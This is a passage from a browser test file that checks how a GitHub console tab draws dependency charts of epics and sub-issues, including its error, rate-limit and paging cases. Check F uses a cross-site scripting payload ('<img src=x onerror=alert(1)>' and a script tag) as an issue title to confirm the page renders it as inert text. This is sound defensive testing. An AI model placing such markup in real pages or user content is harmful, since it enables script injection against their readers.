  console.log('     said after Centre its row:', await page.textContent('#cp-graph-said'), '| focused rows:', JSON.stringify(await page.$$eval('#cp-app tr.control__focus', (rows) => rows.map((r) => r.closest('table').id + ':' + r.getAttribute('data-number')))));
  assert.equal(await page.textContent('#cp-graph-said'), 'Focused #23 (under Queue).');
  assert.equal(await msgText(page), 'Focused #23 (under Queue).');
  await page.waitForSelector('#cp-queue tr[data-number="23"].control__focus', { timeout: 8000 });
  assert.deepEqual(errors, []);
  await context.close();
});

await check('E: when the drawing script cannot be loaded, the tables stand alone and the state says so', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [missingRoute] });
  await signIn(page);
  await waitGraph(page, /^The charts could not be drawn \(the drawing script could not be loaded/);
  const state = await stateText(page);
  const tables = await page.$$eval('#cp-graph table', (ts) => ts.map((t) => t.querySelectorAll('tbody tr').length));
  console.log('     state:', state.slice(0, 120), '| tables:', JSON.stringify(tables), '| svgs:', await page.$$eval('#cp-graph svg', (l) => l.length));
  assert.deepEqual(tables, [2, 4]);
  assert.equal(await page.$$eval('#cp-graph svg', (l) => l.length), 0);
  assert.match(state, /the tables say the same from 4 reads of GitHub: 1 goal and 1 epic with sub-issues\.$/);
  assert.deepEqual(await headings(page), ['Goals', 'Epic #20: Draw the board (1/3)']);
  assert.deepEqual(errors, []);
  await context.close();
});

// Check F's repository: the fixture and epic #41 over the titles above (before A1): among the "%"
// ones, one opening a directive, one holding a whole one, and a pair that opens one and closes it in
// a later node, each of which broke the chart or erased what lay between before the "%" went as an
// entity; a formula KaTeX cannot parse, which stopped the chart before the "$" did; and the folded
// ones. The epic's own title is folded in its heading as the board folds it.
function scenarioF() {
  const f = fixture();
  const children = Object.entries(F_TITLES).map(([n, title]) => issue(Number(n), title, ['todo']));
  f.open.push(issue(41, 'An epic " with a quote, d\u00e9j\u00e0 vu', ['epic'], subs(0, children.length)), ...children);
  f.subIssues[41] = children;
  return fixtureRoutes(f);
}
await check('F: a hostile title is drawn as text, makes no element, runs nothing and fetches nothing', async () => {
  const hostile = HOSTILE;
  const { context, page, errors, requests, dialogs } = await open(scenarioF());
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 5 reads/, 15000);
  await sleep(500);
  const node = await page.$eval('#cp-graph g.node[id*="-flowchart-i42-"]', (g) => ({ text: g.textContent.trim(), html: g.innerHTML }));
  const elements = await page.$$eval('#cp-graph script, #cp-graph img, #cp-graph [onerror], #cp-graph [onload]', (l) => l.length);
  const cell = await page.textContent('#cp-graph tr:has(a[href$="/issues/42"]) td:nth-child(2)');
  console.log('     node text:', JSON.stringify(node.text), '| elements:', elements, '| dialogs:', JSON.stringify(dialogs), '| x fetched:', requests.filter((u) => /\/x$/.test(u)).length);
  assert.equal(node.text, '#42 <img src=x onerror=alert(1)> "] <scri...');
  assert.equal(elements, 0);
  assert.ok(!/<img|<script/i.test(node.html), 'a tag inside the node: ' + node.html.slice(0, 200));
  assert.deepEqual(dialogs, []);
  assert.equal(requests.filter((u) => /\/x$/.test(u)).length, 0);
  assert.equal(cell, hostile);
  assert.deepEqual((await headings(page)).slice(-1), ['Epic #41: An epic " with a quote, deja vu (0/11)']);
  // every chart drawn, epic #41's despite its formulas, each "%" and "$" title shown whole in its
  // node, as words and not as math, and each folded one as the board folds it
  assert.equal(await page.$$eval('#cp-graph .control__chart svg', (l) => l.length), 3);
  assert.equal(await page.$$eval('#cp-graph math, #cp-graph .katex', (l) => l.length), 0, 'a title was typeset as math');
  for (const [n, title] of Object.entries(Object.assign({}, PERCENT_TITLES, DOLLAR_TITLES))) {
    const text = await page.$eval('#cp-graph g.node[id*="-flowchart-i' + n + '-"]', (g) => g.textContent.trim());
    assert.equal(text, '#' + n + ' ' + title);
  }
  for (const [n, [, shown]] of Object.entries(FOLDED_TITLES)) {
    const text = await page.$eval('#cp-graph g.node[id*="-flowchart-i' + n + '-"]', (g) => g.textContent.trim());
    assert.equal(text, shown);
  }
  assert.deepEqual(errors, []);
  await context.close();
});

await check('F2: the text handed the drawing for a hostile title, the "%" and "$" titles and the folded ones is byte for byte the board\'s block, with no "%" or "$" left in it', async () => {
  const { context, page, errors } = await open(scenarioF(), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 5 reads/);
  const charts = await page.evaluate(() => window.__charts);
  console.log('     epic #41 handed:', JSON.stringify(charts[2] && charts[2].split('\n').slice(1, 6)));
  assert.deepEqual(charts, [GOALS_TEXT, EPIC_20_TEXT, F_EPIC_41_TEXT]);
  assert.ok(charts.every((text) => !text.includes('%')), 'a "%" reached the drawing');
  assert.ok(charts.every((text) => !text.includes('$')), 'a "$" reached the drawing');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G1: a 403 on a sub_issues read is said in words and nothing is drawn', async () => {
  const routes = fixtureRoutes(fixture());
  routes['GET /repos/acme/demo/issues/20/sub_issues'] = resp(403, { message: 'Resource not accessible by personal access token' });
  const { context, page, errors, requests } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn: reading the sub-issues of #20 failed\. The token may not do this \(403/);
  await sleep(300);
  console.log('     state:', (await stateText(page)).slice(0, 140), '| children:', await page.$$eval('#cp-graph > *', (l) => l.length), '| vendor loads:', vendorLoads(requests));
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.equal(vendorLoads(requests), 0);
  assert.match(await page.textContent('#cp-summary'), /Not read: the dependencies/);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G2: the rate limit reached (429) on a blocked_by read is said in words and nothing is half drawn', async () => {
  const routes = fixtureRoutes(fixture());
  routes['GET /repos/acme/demo/issues/23/dependencies/blocked_by'] = resp(429, { message: 'API rate limit exceeded' });
  const { context, page, errors } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn: reading the issues blocking #23 failed\. GitHub's rate limit for this token is reached \(429\)/);
  await sleep(300);
  console.log('     state:', (await stateText(page)).slice(0, 140), '| children:', await page.$$eval('#cp-graph > *', (l) => l.length));
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G3: the cap on reads stops the draw before the read past it, said in words', async () => {
  const { context, page, calls, errors } = await open(fixtureRoutes(fixture()), { constants: { GRAPH_READS_MAX: 2 } });
  await signIn(page);
  await waitGraph(page, /^Not drawn: it would take more than 2 reads of GitHub, the most this page makes for one draw; stopped at the issues blocking #23\./);
  await sleep(500);
  console.log('     reads:', JSON.stringify(dependencyReads(calls)), '| children:', await page.$$eval('#cp-graph > *', (l) => l.length));
  assert.deepEqual(dependencyReads(calls), EXPECTED_READS.slice(0, 2));
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('H: a repository with no epic or goal draws nothing, says so, reads nothing more and loads no drawing script', async () => {
  const tasks = [issue(7, 'A task', ['todo']), issue(8, 'Another', ['claimed', 'worker:alice'])];
  const { context, page, calls, errors, requests } = await open(baseRoutes('acme/demo', tasks));
  await signIn(page);
  await waitGraph(page, /^Nothing to draw yet: no open issue labelled epic or goal has sub-issues\. To start, label an issue epic, open it on GitHub and add its tasks under Sub-issues \(Create sub-issue, or Add existing issue\); on a task, add what must close first under Relationships \(Blocked by\); then press Refresh\.$/);
  await page.waitForFunction(() => /Queue: /.test(document.getElementById('cp-summary').textContent));
  await sleep(500);
  console.log('     state:', (await stateText(page)).slice(0, 100), '| reads:', dependencyReads(calls).length, '| vendor loads:', vendorLoads(requests));
  assert.deepEqual(dependencyReads(calls), []);
  assert.equal(vendorLoads(requests), 0);
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('I: Refresh reads again and redraws with the new count of closed tasks', async () => {
  let completed = 1;
  const routes = fixtureRoutes(fixture());
  routes['GET /repos/acme/demo/issues'] = () => fixture(completed).open;
  const { context, page, calls, errors } = await open(routes, { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  assert.deepEqual(await headings(page), ['Goals', 'Epic #20: Draw the board (1/3)']);
  completed = 2;
  await page.click('#cp-refresh');
  await page.waitForFunction(() => /\(2\/3\)/.test(document.getElementById('cp-graph').textContent), null, { timeout: 8000 });
  await waitGraph(page, /^Drawn from 4 reads/);
  const charts = await page.evaluate(() => window.__charts);
  console.log('     headings after:', JSON.stringify(await headings(page)), '| charts handed in all:', charts.length, '| reads in all:', dependencyReads(calls).length);
  assert.deepEqual(await headings(page), ['Goals', 'Epic #20: Draw the board (2/3)']);
  assert.equal(charts[2], GOALS_TEXT.replace('(1/3)', '(2/3)'));
  assert.equal(dependencyReads(calls).length, 8);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('J: a goal is listed with the epics, not in the queue and not as an other issue', async () => {
  const f = fixture();
  f.open.push(issue(50, 'Unlabelled', []));
  const { context, page, errors } = await open(fixtureRoutes(f), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  const other = await page.textContent('#cp-other');
  const summary = await page.textContent('#cp-summary');
  console.log('     other:', other.slice(0, 80), '| summary:', summary.replace(/.*Queue: /, 'Queue: ').slice(0, 120));
  assert.equal(await page.$$eval('#cp-epics tr[data-number="30"]', (l) => l.length), 1);
  assert.equal(await page.$$eval('#cp-queue tr[data-number="30"]', (l) => l.length), 0);
  assert.ok(!/#30/.test(other), 'the goal is named as an other issue: ' + other);
  assert.match(other, /1 other open issue carries none of the protocol's labels: #50 Unlabelled\./);
  assert.match(summary, /Queue: 2 unclaimed issues; given to workers: 1; claimed: 1 \(#22 by alice\); in review: 0; blocked: 0; blockers: 1; epics and goals: 2\./);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('K: switching repositories mid-draw never shows the earlier repository\'s charts under the new one', async () => {
  const routes = Object.assign(fixtureRoutes(fixture()), baseRoutes('acme/beta', [issue(3, 'A task of beta', ['todo'])]));
  routes['GET /repos/acme/demo/issues/20/sub_issues'] = resp(200, fixture().subIssues[20], { delayMs: 2500 });
  const { context, page, calls, errors } = await open(routes, { extraRoutes: [stubRoute], storage: { symphony_panel_repos: JSON.stringify(['acme/demo', 'acme/beta']) } });
  await signIn(page);
  await waitGraph(page, /^Reading the sub-issues of 2 epics and goals/);
  await page.selectOption('#cp-repo', 'acme/beta');
  await waitGraph(page, /^Nothing to draw/);
  await sleep(3500);
  const state = await stateText(page);
  const text = await page.textContent('#cp-graph');
  console.log('     repo:', await page.textContent('#cp-repo-shown'), '| state:', state.slice(0, 60), '| graph text:', JSON.stringify(text.slice(0, 60)), '| demo reads after the switch:', dependencyReads(calls).filter((k) => /acme\/demo/.test(k)).length);
  assert.match(state, /^Nothing to draw/);
  assert.equal(text, '');
  assert.equal(await page.evaluate(() => (window.__charts || []).length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('L: the table under each chart says the state, what blocks each task and the worker, in words', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  const rows = await page.$$eval('#cp-graph table', (tables) => tables.map((t) => Array.from(t.querySelectorAll('tbody tr')).map((tr) => Array.from(tr.querySelectorAll('td')).slice(0, 5).map((td) => td.textContent.trim()))));
  const heads = await page.$$eval('#cp-graph table', (tables) => tables.map((t) => Array.from(t.querySelectorAll('th')).map((th) => th.textContent.trim())));
  console.log('     goals table:', JSON.stringify(rows[0]), '\n     epic table:', JSON.stringify(rows[1]));
  assert.deepEqual(heads, [['Issue', 'Title', 'State', 'Its epics', 'Worker', 'Actions'], ['Issue', 'Title', 'State', 'Blocked by', 'Worker', 'Actions']]);
  assert.deepEqual(rows[0], [['#20', 'Draw the board', 'open', '', ''], ['#30', 'Ship the graph', 'todo, unclaimed', '#20', '']]);
  assert.deepEqual(rows[1], [
    ['#21', 'Read the summary', 'closed', '', ''],
    ['#22', 'Render the section', 'claimed', '#99', 'alice'],
    ['#23', 'Write the body | with "quotes" and <tags> #5 and a title long enough to be cut short', 'todo, unclaimed', '#21 (closed), #22', ''],
    ['#99', 'Settle the colours', 'todo, unclaimed', '', ''],
  ]);
  const links = await page.$$eval('#cp-graph tbody a', (as) => as.map((a) => [a.getAttribute('href'), a.target, a.rel]));
  assert.ok(links.every((l) => /^https:\/\/github\.com\/acme\/demo\/issues\/[0-9]+$/.test(l[0]) && l[1] === '_blank' && l[2] === 'noopener'), 'a link off the repository or without noopener: ' + JSON.stringify(links));
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G4: a read that finds the token under the reserve stops the draw there, said in words', async () => {
  const f = fixture();
  const routes = fixtureRoutes(f);
  routes['GET /repos/acme/demo/issues/20/sub_issues'] = resp(200, f.subIssues[20], { headers: { 'X-RateLimit-Remaining': '99', 'Access-Control-Expose-Headers': 'ETag, Link, X-RateLimit-Remaining' } });
  const { context, page, calls, errors } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn: GitHub says/);
  await sleep(500);
  const state = await stateText(page);
  console.log('     state:', state, '| reads:', JSON.stringify(dependencyReads(calls)));
  assert.equal(state, 'Not drawn: GitHub says this token has 99 calls left this hour, and the page keeps the last 100 for the rest of the console; stopped at the issues blocking #22. Press Refresh once GitHub\'s hourly limit has reset.');
  assert.deepEqual(dependencyReads(calls), EXPECTED_READS.slice(0, 1));
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G6: the reserve follows the newest count GitHub gives on any of the console\'s reads, and a draw that then succeeds takes its earlier failure off the summary', async () => {
  const f = fixture();
  const routes = fixtureRoutes(f);
  const expose = 'ETag, Link, X-RateLimit-Remaining';
  let issuesLeft = 150, pullsLeft = 60;
  routes['GET /repos/acme/demo/issues'] = () => resp(200, f.open, { headers: { 'X-RateLimit-Remaining': String(issuesLeft), 'Access-Control-Expose-Headers': expose } });
  // the pull requests answer while the first sub-issue read is still out, with a count the draw
  // began above, so the read after it is the one the newer count stops
  routes['GET /repos/acme/demo/pulls'] = () => resp(200, [], { delayMs: 600, headers: { 'X-RateLimit-Remaining': String(pullsLeft), 'Access-Control-Expose-Headers': expose } });
  routes['GET /repos/acme/demo/issues/20/sub_issues'] = resp(200, f.subIssues[20], { delayMs: 1500 });
  const { context, page, calls, errors } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn: GitHub says/);
  await sleep(500);
  const state = await stateText(page);
  console.log('     state:', state, '| reads:', JSON.stringify(dependencyReads(calls)));
  assert.equal(state, 'Not drawn: GitHub says this token has 60 calls left this hour, and the page keeps the last 100 for the rest of the console; stopped at the issues blocking #22. Press Refresh once GitHub\'s hourly limit has reset.');
  assert.deepEqual(dependencyReads(calls), EXPECTED_READS.slice(0, 1));
  await page.waitForFunction(() => /Not read: the dependencies/.test(document.getElementById('cp-summary').textContent), null, { timeout: 8000 });
  // a task queued redraws on the same state, as Give to, a mention and a merge do, so only the
  // draw itself can take its earlier failure off the summary
  issuesLeft = 4000; pullsLeft = 4000;
  routes['POST /repos/acme/demo/issues'] = resp(201, { number: 99, html_url: 'https://github.com/acme/demo/issues/99', title: 'Task: x' });
  await toTab(page, 'tasks');
  await page.fill('#cp-task-title', 'x');
  await page.fill('#cp-task-goal', 'g');
  await page.fill('#cp-task-acceptance', 'a');
  await page.click('#cp-task-queue');
  await waitGraph(page, /^Drawn /, 15000);
  await sleep(500);
  const summary = await page.textContent('#cp-summary');
  console.log('     after the task:', await stateText(page), '| summary:', summary.slice(0, 120));
  assert.doesNotMatch(summary, /the dependencies/);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G5: once the open issues\' answer says the token is under the reserve, a draw reads nothing, and a Refresh under it reads nothing either', async () => {
  const f = fixture();
  const routes = fixtureRoutes(f);
  let left = 99;
  routes['GET /repos/acme/demo/issues'] = () => resp(200, f.open, { headers: { 'X-RateLimit-Remaining': String(left--), 'Access-Control-Expose-Headers': 'ETag, Link, X-RateLimit-Remaining' } });
  const { context, page, calls, errors, requests } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn: GitHub says/);
  await sleep(500);
  const state = await stateText(page);
  console.log('     state:', state, '| reads:', JSON.stringify(dependencyReads(calls)));
  assert.equal(state, 'Not drawn: GitHub says this token has 99 calls left this hour, and the page keeps the last 100 for the rest of the console; stopped at the sub-issues of #20. Press Refresh once GitHub\'s hourly limit has reset.');
  assert.deepEqual(dependencyReads(calls), []);
  await page.click('#cp-refresh');
  await waitGraph(page, /^Not drawn: GitHub says this token has 98 calls/);
  await sleep(500);
  console.log('     after Refresh:', await stateText(page), '| reads:', JSON.stringify(dependencyReads(calls)));
  assert.deepEqual(dependencyReads(calls), []);
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.equal(vendorLoads(requests), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

// Check M's repository: the fixture and a second epic whose sub-issues come in two pages, holding a
// pull request, another repository's issue, #23 again (under #20 too), a task whose blocked_by
// answers 410 and a task blocked from outside the epic, one blocker of it in another repository; a
// goal over both epics; and an issue labelled goal and epic, its title padded. The four blocks
// below are what the library at FIXTURE_COMMIT writes for these objects, its own reads
// (adapters/github.py DependencyReads) run over them and board.render after.
const OTHER_REPO = 'https://api.github.com/repos/other/place';
function scenarioM() {
  const f = fixture();
  const [i20, i22, i23, i24, i25, i30, i99] = f.open;
  i30.sub_issues_summary = subs(0, 2).sub_issues_summary;
  const i60 = issue(60, 'Second epic', ['epic'], Object.assign(subs(1, 6), deps(1, 1)));
  const i61 = issue(61, 'A pull request listed as a sub-issue', ['todo'], { pull_request: { url: 'https://api.github.com/repos/acme/demo/pulls/61' } });
  const i7 = issue(7, 'Another repository\'s issue', ['todo'], { repository_url: OTHER_REPO });
  const i62 = issue(62, 'Its blocker was deleted', ['todo'], deps(1, 1));
  const i63 = issue(63, 'Waits on three here', ['blocked'], deps(3, 4));
  const i8 = issue(8, 'Elsewhere', ['todo'], { repository_url: OTHER_REPO });
  const i64 = issue(64, 'Closed long ago', ['todo'], { state: 'closed' });
  const i65 = issue(65, 'An outside blocker', ['todo'], deps(2, 3));
  // padded with the separators Python's strip() takes and JavaScript's trim() does not
  const i70 = issue(70, '\x1c A goal that is an epic \x1f', ['goal', 'epic'], subs(0, 1));
  const i71 = issue(71, 'Under the goal and epic', ['todo'], deps(0, 0));
  const routes = baseRoutes('acme/demo', [i20, i22, i23, i24, i25, i30, i99, i60, i65, i70]);
  const lists = { 20: f.subIssues[20], 30: [i20, i60], 70: [i71] };
  for (const n of Object.keys(lists)) routes['GET /repos/acme/demo/issues/' + n + '/sub_issues'] = lists[n];
  const next = '<https://api.github.com/repos/acme/demo/issues/60/sub_issues?per_page=100&page=2>; rel="next"';
  routes['GET /repos/acme/demo/issues/60/sub_issues'] = (url) => url.searchParams.get('page') === '2' ? [i62, i63] : resp(200, [i61, i7, i23], { headers: { Link: next } });
  routes['GET /repos/acme/demo/issues/22/dependencies/blocked_by'] = f.blockedBy[22];
  routes['GET /repos/acme/demo/issues/23/dependencies/blocked_by'] = f.blockedBy[23];
  routes['GET /repos/acme/demo/issues/62/dependencies/blocked_by'] = resp(410, { message: 'This issue was deleted' });
  routes['GET /repos/acme/demo/issues/63/dependencies/blocked_by'] = [i25, i8, i64, i65];
  return routes;
}
const CLASS_LINES = [
  '  classDef todo fill:#ffffff,stroke:#0e8a16,color:#000000',
  '  classDef claimed fill:#fff8d6,stroke:#fbca04,color:#000000',
  '  classDef review fill:#e3f0ff,stroke:#1d76db,color:#000000',
  '  classDef blocked fill:#ffe7e7,stroke:#e99695,color:#000000',
  '  classDef closed fill:#eeeeee,stroke:#999999,color:#666666',
];
const M_GOALS_TEXT = [
  'flowchart TD',
  '  i20["#20 Draw the board (1/3)"]',
  '  i30["#30 Ship the graph (0/2)"]:::todo',
  '  i60["#60 Second epic (1/6)"]',
  '  i70["#70 A goal that is an epic (0/1)"]',
  '  i71["#71 Under the goal and epic"]:::todo',
  '  i30 ==> i20',
  '  i30 ==> i60',
  '  i70 ==> i71',
].concat(CLASS_LINES).join('\n');
const M_EPIC_60_TEXT = [
  'flowchart TD',
  '  i21["#21 Read the summary"]:::closed',
  '  i22["#22 Render the section"]:::claimed',
  '  i23["#23 Write the body #124; with #quot;quotes#quot; and #lt;t..."]:::todo',
  '  i25["#25 Fix the build"]',
  '  i62["#62 Its blocker was deleted"]:::todo',
  '  i63["#63 Waits on three here"]:::blocked',
  '  i64["#64 Closed long ago"]:::closed',
  '  i65["#65 An outside blocker"]:::todo',
  '  i21 -.-> i23',
  '  i22 --> i23',
  '  i25 --> i63',
  '  i64 -.-> i63',
  '  i65 --> i63',
].concat(CLASS_LINES).join('\n');
const M_EPIC_70_TEXT = ['flowchart TD', '  i71["#71 Under the goal and epic"]:::todo'].concat(CLASS_LINES).join('\n');

await check('M: every page of a sub-issue list is read and counted, a pull request, another repository\'s issue and a deleted one are left out, a task under two epics is read once, and the charts are the board\'s bytes', async () => {
  const { context, page, calls, errors } = await open(scenarioM(), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 9 reads/);
  await sleep(300);
  const charts = await page.evaluate(() => window.__charts);
  const reads = calls.filter((c) => dependencyReads([c]).length).map((c) => { const u = new URL(c.url); return u.pathname + (u.searchParams.get('page') ? '?page=' + u.searchParams.get('page') : ''); });
  console.log('     reads:', JSON.stringify(reads), '\n     headings:', JSON.stringify(await headings(page)));
  assert.deepEqual(reads, [
    '/repos/acme/demo/issues/20/sub_issues', '/repos/acme/demo/issues/22/dependencies/blocked_by', '/repos/acme/demo/issues/23/dependencies/blocked_by',
    '/repos/acme/demo/issues/30/sub_issues', '/repos/acme/demo/issues/60/sub_issues', '/repos/acme/demo/issues/60/sub_issues?page=2',
    '/repos/acme/demo/issues/62/dependencies/blocked_by', '/repos/acme/demo/issues/63/dependencies/blocked_by', '/repos/acme/demo/issues/70/sub_issues',
  ]);
  assert.deepEqual(charts, [M_GOALS_TEXT, EPIC_20_TEXT, M_EPIC_60_TEXT, M_EPIC_70_TEXT]);
  assert.deepEqual(await headings(page), ['Goals', 'Epic #20: Draw the board (1/3)', 'Epic #60: Second epic (1/6)', 'Epic #70: A goal that is an epic (0/1)']);
  const rows = await page.$$eval('#cp-graph table', (tables) => tables.map((t) => Array.from(t.querySelectorAll('tbody tr')).map((tr) => Array.from(tr.querySelectorAll('td')).slice(0, 4).map((td) => td.textContent.trim()))));
  console.log('     epic #60 table:', JSON.stringify(rows[2]));
  assert.deepEqual(rows[2].map((r) => [r[0], r[2], r[3]]), [
    ['#21', 'closed', ''], ['#22', 'claimed', '#99'], ['#23', 'todo, unclaimed', '#21 (closed), #22'], ['#25', 'open', '1 open issue'],
    ['#62', 'todo, unclaimed', ''], ['#63', 'blocked', '#25, #64 (closed), #65'], ['#64', 'closed', ''], ['#65', 'todo, unclaimed', '2 open issues and 1 closed one'],
  ]);
  assert.match(await stateText(page), /^Drawn from 9 reads of GitHub: 2 goals and 3 epics with sub-issues\./);
  assert.deepEqual(errors, []);
  await context.close();
  // the second page of a list is one read against the cap, as the first is
  const capped = await open(scenarioM(), { extraRoutes: [stubRoute], constants: { GRAPH_READS_MAX: 5 } });
  await signIn(capped.page);
  await waitGraph(capped.page, /^Not drawn: it would take more than 5 reads/);
  await sleep(300);
  console.log('     capped:', await stateText(capped.page));
  assert.equal(await stateText(capped.page), 'Not drawn: it would take more than 5 reads of GitHub, the most this page makes for one draw; stopped at the sub-issues of #60. Closing the epics that are done makes it fewer.');
  assert.equal(dependencyReads(capped.calls).length, 5);
  assert.equal(await capped.page.evaluate(() => (window.__charts || []).length), 0);
  assert.deepEqual(capped.errors, []);
  await capped.context.close();
});

await check('N: a repository whose record cannot be read leaves the tab saying so, never reading', async () => {
  const routes = fixtureRoutes(fixture());
  delete routes['GET /repos/acme/demo'];
  const { context, page, calls, errors } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn/);
  await page.waitForFunction(() => /Could not read acme\/demo/.test(document.getElementById('cp-summary').textContent), null, { timeout: 8000 });
  console.log('     state:', await stateText(page), '| summary:', (await page.textContent('#cp-summary')).slice(0, 80));
  assert.equal(await stateText(page), 'Not drawn: the repository could not be read.');
  assert.deepEqual(dependencyReads(calls), []);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('O: a repository named by its old name is read under the name GitHub gives it, and its charts are drawn', async () => {
  const f = fixture();
  const renamed = (it) => Object.assign({}, it, { repository_url: 'https://api.github.com/repos/acme/renamed', html_url: it.html_url.replace('acme/demo', 'acme/renamed') });
  const routes = baseRoutes('acme/demo', f.open.map(renamed));
  routes['GET /repos/acme/demo'] = Object.assign({}, routes['GET /repos/acme/demo'], { full_name: 'acme/renamed' });
  for (const n of Object.keys(f.subIssues)) routes['GET /repos/acme/renamed/issues/' + n + '/sub_issues'] = f.subIssues[n].map(renamed);
  for (const n of Object.keys(f.blockedBy)) routes['GET /repos/acme/renamed/issues/' + n + '/dependencies/blocked_by'] = f.blockedBy[n].map(renamed);
  const { context, page, calls, errors } = await open(routes, { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  console.log('     reads:', JSON.stringify(dependencyReads(calls)));
  assert.deepEqual(await page.evaluate(() => window.__charts), [GOALS_TEXT, EPIC_20_TEXT]);
  assert.deepEqual(dependencyReads(calls), EXPECTED_READS.map((k) => k.replace('acme/demo', 'acme/renamed')));
  assert.deepEqual(errors, []);
  await context.close();
});

await check('P: a task whose claim branch has an open pull request is shaded claimed, as the board shades it, the pull requests waited for and a fork\'s branch not counted', async () => {
  const routes = fixtureRoutes(fixture());
  const pull = (number, ref, fullName) => ({ number, title: 'Work on it', html_url: 'https://github.com/acme/demo/pull/' + number, draft: true, updated_at: now, user: { login: 'bob' }, base: { ref: 'main' }, head: { ref, sha: 'a'.repeat(40), repo: { full_name: fullName } } });
  // the pull requests answer after the tab's reads, so the chart is drawn only once they are in
  routes['GET /repos/acme/demo/pulls'] = resp(200, [pull(80, 'claude/23', 'acme/demo'), pull(81, 'claude/99', 'mallory/demo')], { delayMs: 2500 });
  const { context, page, errors } = await open(routes, { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 12000);
  const charts = await page.evaluate(() => window.__charts);
  // a row by the issue its first cell names, since a Blocked by cell links other issues too
  const stateOf = (n) => page.textContent('#cp-graph tr:has(td:first-child a[href$="/issues/' + n + '"]) td:nth-child(3)');
  const state23 = await stateOf(23);
  console.log('     #23 line:', JSON.stringify(charts[1].split('\n')[3]), '| #23 state:', state23);
  assert.deepEqual(charts, [GOALS_TEXT, EPIC_20_TEXT.replace('#lt;t..."]:::todo', '#lt;t..."]:::claimed')]);
  assert.equal(state23, 'claimed');
  assert.equal(await stateOf(99), 'todo, unclaimed');
  assert.deepEqual(errors, []);
  await context.close();
});

// a stand-in for the drawing library that cannot draw the goals' chart, as Mermaid fails on a text
// it cannot parse
const STUB_FAILS_GOALS = "window.mermaid = { initialize: function () {}, render: function (id, text) { (window.__charts = window.__charts || []).push(text); return /==>/.test(text) ? Promise.reject(new Error('Parse error on line 3')) : Promise.resolve({ svg: '<svg data-stub=\"1\"></svg>' }); } };";
await check('Q: one chart that cannot be drawn leaves the others drawn, and the words name it and count the rest', async () => {
  const route = [VENDOR, (r) => r.fulfill({ status: 200, contentType: 'application/javascript', body: STUB_FAILS_GOALS })];
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [route] });
  await signIn(page);
  await waitGraph(page, /^Drawn 1 of 2 charts/);
  const hosts = await page.$$eval('#cp-graph .control__chart', (list) => list.map((h) => h.querySelectorAll('svg').length));
  const state = await stateText(page);
  console.log('     state:', state, '| svgs per chart:', JSON.stringify(hosts));
  assert.equal(state, 'Drawn 1 of 2 charts from 4 reads of GitHub: 1 goal and 1 epic with sub-issues; 1 chart could not be drawn (Goals: Parse error on line 3), and the table under it says the same.');
  assert.deepEqual(hosts, [0, 1]);
  assert.deepEqual(await page.evaluate(() => window.__charts), [GOALS_TEXT, EPIC_20_TEXT]);
  assert.deepEqual(await page.$$eval('#cp-graph table', (ts) => ts.map((t) => t.querySelectorAll('tbody tr').length)), [2, 4]);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('R: the board\'s own charts are drawn in the Board tab while it is hidden, never shown as text, show whole when it opens, and a node there opens the Tasks tab with its row centred in that tab\'s box', async () => {
  const routes = fixtureRoutes(fixture());
  const withCharts = board + '\n## Dependencies\n\nEach open epic\'s tasks as GitHub\'s sub-issues and blocked-by relations hold them.\n\n### Goals\n\n```mermaid\n' + GOALS_TEXT + '\n```\n\n### Epic #20: Draw the board (1/3)\n\n```mermaid\n' + EPIC_20_TEXT + '\n```\n';
  routes['GET /repos/acme/demo/contents/STATE.md'] = { encoding: 'base64', content: b64(withCharts) };
  const { context, page, errors, requests } = await open(routes);
  await signIn(page);
  // drawn while the Dependencies tab is shown and the Board tab hidden
  await page.waitForFunction(() => document.querySelectorAll('#cp-board .control__chart svg').length === 2, null, { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const drawnHidden = await page.evaluate(() => document.getElementById('tab-board').hidden);
  await toTab(page, 'board');
  const sizes = await page.$$eval('#cp-board .control__chart svg', (list) => list.map((svg) => [svg.getBoundingClientRect().width, svg.getBoundingClientRect().height]));
  console.log('     drawn while hidden:', drawnHidden, '| sizes once shown:', JSON.stringify(sizes.map((x) => x.map(Math.round))));
  assert.equal(drawnHidden, true);
